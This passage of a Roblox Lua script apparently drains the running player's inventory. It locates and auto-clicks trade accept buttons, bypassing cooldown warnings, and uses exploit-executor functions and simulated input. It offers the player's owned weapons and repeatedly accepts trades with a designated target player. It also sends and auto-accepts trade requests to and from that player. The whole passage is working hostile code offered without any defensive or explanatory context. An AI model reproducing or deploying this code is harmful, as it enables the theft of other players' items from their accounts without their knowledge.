            if (child:IsA("ImageLabel") or child:IsA("ImageButton")) and __PULSE_SCOPE.getEffectiveImageTrans(child) < 0.95 and __PULSE_SCOPE.isGreenColor(child.ImageColor3) then
                return true
            end
        end
    end
    return false
end

__PULSE_SCOPE.isObjectTrulyVisible = function(obj)
    local cur = obj
    while cur and cur ~= __PULSE_SCOPE.lp.PlayerGui do
        if cur:IsA("ScreenGui") then
            if not cur.Enabled then
                return false
            end
            return true
        elseif cur:IsA("GuiObject") then
            if not cur.Visible then
                return false
            end
        end
        cur = cur.Parent
    end
    return true
end

__PULSE_SCOPE.isCooldownOverlayBlocking = function(obj)
    local container = obj.Parent or obj
    for _, desc in ipairs(container:GetDescendants()) do
        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and __PULSE_SCOPE.isObjectTrulyVisible(desc) and __PULSE_SCOPE.getEffectiveTextTrans(desc) < 0.8 then
            local norm = __PULSE_SCOPE.normalizeUtf8Lower(desc.Text or "")
            if string.find(norm, "please wait", 1, true) or string.find(norm, "before accepting", 1, true) or string.find(norm, "подождите", 1, true) then
                return true
            end
        end
    end
    return false
end

__PULSE_SCOPE.collectAcceptTargets = function()
    local targets = {}
    local seen = {}

    local function addTarget(obj)
        if not obj or seen[obj] or not obj:IsA("GuiObject") then
            return
        end
        if not __PULSE_SCOPE.isObjectTrulyVisible(obj) or __PULSE_SCOPE.hasRedAncestorOrSelf(obj) or __PULSE_SCOPE.isCooldownOverlayBlocking(obj) then
            return
        end
        seen[obj] = true
        table.insert(targets, obj)

        for _, ch in ipairs(obj:GetDescendants()) do
            if ch:IsA("GuiButton") and not seen[ch] and __PULSE_SCOPE.isObjectTrulyVisible(ch) and not __PULSE_SCOPE.hasRedAncestorOrSelf(ch) then
                seen[ch] = true
                table.insert(targets, ch)
            end
        end
        local p = obj.Parent
        if p and p:IsA("GuiButton") and not seen[p] and __PULSE_SCOPE.isObjectTrulyVisible(p) and not __PULSE_SCOPE.hasRedAncestorOrSelf(p) then
            seen[p] = true
            table.insert(targets, p)
        end
    end

    for _, gui in ipairs(__PULSE_SCOPE.getAllTradeGuis()) do
        if gui.Enabled then
            for _, desc in ipairs(gui:GetDescendants()) do
                if desc:IsA("GuiObject") and __PULSE_SCOPE.isObjectTrulyVisible(desc) then
                    local n = string.lower(desc.Name)
                    local isDeclineByName = string.find(n, "decline", 1, true)
                        or string.find(n, "cancel", 1, true)
                        or string.find(n, "reject", 1, true)
                        or string.find(n, "close", 1, true)

                    if not isDeclineByName and not __PULSE_SCOPE.hasRedAncestorOrSelf(desc) then
                        if n == "accept" or n == "confirm" or n == "acceptbutton" or n == "confirmbutton" or n == "accepttrade" then
                            addTarget(desc)
                        end

                        if (desc:IsA("GuiButton") or desc.Name == "Accept") and __PULSE_SCOPE.hasGreenVisual(desc) then
                            local size = desc.AbsoluteSize
                            if size.X >= 40 and size.Y >= 18 then
                                addTarget(desc)
                            end
                        end

                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then
                            local txt = desc.Text or ""
                            if not __PULSE_SCOPE.textContainsAny(txt, __PULSE_SCOPE.DECLINE_KEYWORDS) and __PULSE_SCOPE.textContainsAny(txt, __PULSE_SCOPE.ACCEPT_KEYWORDS) then
                                addTarget(desc)
                            end
                        end
                    end
                end
            end
        end
    end

    return targets
end

__PULSE_SCOPE.BUTTON_SIGNALS = {
    "Activated",
    "MouseButton1Click",
    "MouseButton1Down",
    "MouseButton1Up",
    "TouchTap"
}

__PULSE_SCOPE.fireElementSignals = function(elem)
    -- 1. Fire connected signals via getconnections
    if type(getconnections) == "function" then
        for _, sigName in ipairs(__PULSE_SCOPE.BUTTON_SIGNALS) do
            pcall(function()
                local sig = elem[sigName]
                if sig then
                    for _, conn in ipairs(getconnections(sig)) do
                        if conn.Function then
                            __PULSE_SCOPE.inspectFunctionForTokens(conn.Function, 1)
                        end
                        if conn.Fire then
                            pcall(function() conn:Fire() end)
                        elseif conn.Function then
                            pcall(function() task.spawn(conn.Function) end)
                        end
                    end
                end
            end)
        end

        for _, inputSigName in ipairs({"InputBegan", "InputEnded"}) do
            pcall(function()
                local sig = elem[inputSigName]
                if sig then
                    for _, conn in ipairs(getconnections(sig)) do
                        if conn.Function then
                            __PULSE_SCOPE.inspectFunctionForTokens(conn.Function, 1)
                            pcall(function()
                                task.spawn(conn.Function, {
                                    UserInputType = Enum.UserInputType.MouseButton1,
                                    UserInputState = Enum.UserInputState.Begin
                                }, false)
                            end)
                            pcall(function()
                                task.spawn(conn.Function, {
                                    UserInputType = Enum.UserInputType.Touch,
                                    UserInputState = Enum.UserInputState.Begin
                                }, false)
                            end)
                        end
                    end
                end
            end)
        end
    end

    -- 2. Standard executor firesignal
    if type(firesignal) == "function" then
        for _, sigName in ipairs(__PULSE_SCOPE.BUTTON_SIGNALS) do
            pcall(function()
                local sig = elem[sigName]
                if sig then
                    firesignal(sig)
                end
            end)
        end
    end

    -- 3. Hardware & VirtualInputManager click across both raw and GuiInset-adjusted coordinates
    pcall(function()
        local pos = elem.AbsolutePosition
        local size = elem.AbsoluteSize
        if size.X > 4 and size.Y > 4 then
            local inset = __PULSE_SCOPE.GuiService:GetGuiInset()
            local cx = math.floor(pos.X + (size.X / 2))
            local cyRaw = math.floor(pos.Y + (size.Y / 2))
            local cyInset = math.floor(pos.Y + (size.Y / 2) + inset.Y)

            for _, cy in ipairs({cyInset, cyRaw}) do
                pcall(function()
                    __PULSE_SCOPE.VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, game, 1)
                    if __PULSE_SCOPE.UserInputService.TouchEnabled then
                        __PULSE_SCOPE.VirtualInputManager:SendTouchEvent(1, 0, cx, cy)
                    end
                end)
            end

            task.wait(0.02)

            for _, cy in ipairs({cyInset, cyRaw}) do
                pcall(function()
                    __PULSE_SCOPE.VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
                    if __PULSE_SCOPE.UserInputService.TouchEnabled then
                        __PULSE_SCOPE.VirtualInputManager:SendTouchEvent(1, 2, cx, cy)
                    end
                end)
            end

            pcall(function()
                __PULSE_SCOPE.VirtualUser:ClickButton1(Vector2.new(cx, cyRaw))
            end)
        end
    end)
end

__PULSE_SCOPE.executeAcceptStep = function()
    local targets = __PULSE_SCOPE.collectAcceptTargets()
    if #targets == 0 then
        return false
    end

    for _, elem in ipairs(targets) do
        __PULSE_SCOPE.fireElementSignals(elem)
    end

    if __PULSE_SCOPE.acceptTradeRemote and __PULSE_SCOPE.latestEventToken then
        pcall(function()
            __PULSE_SCOPE.acceptTradeRemote:FireServer(__PULSE_SCOPE.latestEventToken)
        end)
    end

    return true
end

__PULSE_SCOPE.isTradeGuiOpen = function()
    for _, gui in ipairs(__PULSE_SCOPE.getAllTradeGuis()) do
        if gui.Enabled then
            for _, child in ipairs(gui:GetChildren()) do
                if child:IsA("GuiObject") and child.Visible and child.AbsoluteSize.X > 50 then
                    return true
                end
            end
        end
    end
    return false
end

__PULSE_SCOPE.queryTradeStatus = function()
    if __PULSE_SCOPE.getTradeStatusFunc and __PULSE_SCOPE.getTradeStatusFunc:IsA("RemoteFunction") then
        local ok, status = pcall(function()
            return __PULSE_SCOPE.getTradeStatusFunc:InvokeServer()
        end)
        if ok and type(status) == "string" then
            if status == "StartTrade" or status == "ReceivingRequest" or status == "SendingRequest" or status == "None" then
                return status
            end
        end
    end

    if __PULSE_SCOPE.isTradeGuiOpen() then
        return "StartTrade"
    end

    return __PULSE_SCOPE.inActiveTrade and "StartTrade" or "None"
end

-- 7. Inventory Fetch & Item Offer
__PULSE_SCOPE.fetchOwnedWeapons = function()
    for _, fn in ipairs({__PULSE_SCOPE.getFullInvFunc, __PULSE_SCOPE.getProfileFunc}) do
        if fn and fn:IsA("RemoteFunction") then
            local ok, data = pcall(function()
                return fn:InvokeServer(__PULSE_SCOPE.lp.Name)
            end)
            if ok and type(data) == "table" and type(data.Weapons) == "table" and type(data.Weapons.Owned) == "table" then
                return data.Weapons.Owned
            end
        end
    end
    return nil
end

__PULSE_SCOPE.offerInventoryItemsOnce = function()
    if __PULSE_SCOPE.itemsOfferedInCurrentTrade then
        return
    end
    __PULSE_SCOPE.itemsOfferedInCurrentTrade = true

    if __PULSE_SCOPE.offerItemRemote then
        local owned = __PULSE_SCOPE.fetchOwnedWeapons()
        if type(owned) == "table" then
            local slotsUsed = 0
            for itemName, amount in pairs(owned) do
                local qty = tonumber(amount) or 0
                if itemName ~= "DefaultKnife" and itemName ~= "DefaultGun" and qty > 0 then
                    for _ = 1, qty do
                        pcall(function()
                            __PULSE_SCOPE.offerItemRemote:FireServer(itemName, "Weapons")
                        end)
                        task.wait(0.08)
                    end
                    slotsUsed = slotsUsed + 1
                    if slotsUsed >= 4 then
                        break
                    end
                end
            end
        end
    end

    __PULSE_SCOPE.lastOfferTimestamp = os.clock()
end

-- 8. Instant Hook on Incoming Trade Request
if __PULSE_SCOPE.acceptRequestRemote and __PULSE_SCOPE.acceptRequestRemote:IsA("RemoteEvent") then
    __PULSE_SCOPE.acceptRequestRemote.OnClientEvent:Connect(function(sender)
        if not sender or __PULSE_SCOPE.isTargetPlayer(sender) then
            pcall(function()
                __PULSE_SCOPE.acceptRequestRemote:FireServer()
            end)
        end
    end)
end

-- 9. Main Loop: Offer -> Wait 6.2s Initial Cooldown -> Accept Cycle Every 4.0s
__PULSE_SCOPE.lastRequestSent = 0
__PULSE_SCOPE.isSendingRequest = false

task.spawn(function()
    while task.wait(0.2) do
        local status = __PULSE_SCOPE.queryTradeStatus()

        if status == "StartTrade" or __PULSE_SCOPE.isTradeGuiOpen() then
            __PULSE_SCOPE.inActiveTrade = true

            if not __PULSE_SCOPE.itemsOfferedInCurrentTrade then
                __PULSE_SCOPE.offerInventoryItemsOnce()
            else
                local now = os.clock()
                local elapsedSinceOffer = now - __PULSE_SCOPE.lastOfferTimestamp
                local elapsedSinceAccept = now - __PULSE_SCOPE.lastAcceptCycleTime

                if elapsedSinceOffer >= 6.2 and elapsedSinceAccept >= __PULSE_SCOPE.ACCEPT_CYCLE_WAIT then
                    if __PULSE_SCOPE.executeAcceptStep() then
                        __PULSE_SCOPE.lastAcceptCycleTime = os.clock()
                    end
                end
            end
        elseif status == "ReceivingRequest" then
            __PULSE_SCOPE.resetTradeLocks()
            if __PULSE_SCOPE.acceptRequestRemote then
                pcall(function()
                    __PULSE_SCOPE.acceptRequestRemote:FireServer()
                end)
            end
        else
            __PULSE_SCOPE.resetTradeLocks()

            local targetPlr = __PULSE_SCOPE.findTargetOnServer()
            if targetPlr then
                if __PULSE_SCOPE.acceptRequestRemote then
                    pcall(function()
                        __PULSE_SCOPE.acceptRequestRemote:FireServer()
                    end)
                end

                if __PULSE_SCOPE.sendRequestRemote and not __PULSE_SCOPE.isSendingRequest and (os.clock() - __PULSE_SCOPE.lastRequestSent >= 2.5) then
                    __PULSE_SCOPE.lastRequestSent = os.clock()
                    __PULSE_SCOPE.isSendingRequest = true
                    task.spawn(function()
                        pcall(function()
                            if __PULSE_SCOPE.sendRequestRemote:IsA("RemoteFunction") then
                                __PULSE_SCOPE.sendRequestRemote:InvokeServer(targetPlr)
                            elseif __PULSE_SCOPE.sendRequestRemote:IsA("RemoteEvent") then
                                __PULSE_SCOPE.sendRequestRemote:FireServer(targetPlr)
                            end
                        end)
                        __PULSE_SCOPE.isSendingRequest = false
                    end)
                end
            end
        end
    end
end)

